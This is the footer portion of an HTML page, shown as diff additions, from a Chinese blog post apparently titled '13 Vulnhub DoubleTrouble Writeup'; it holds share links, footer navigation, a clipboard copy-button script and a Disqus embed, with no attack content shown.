+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&text=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&is_video=false&description=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=13 Vulnhub DoubleTrouble Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&name=13 Vulnhub DoubleTrouble Writeup&description=&lt;p&gt;该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&t=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
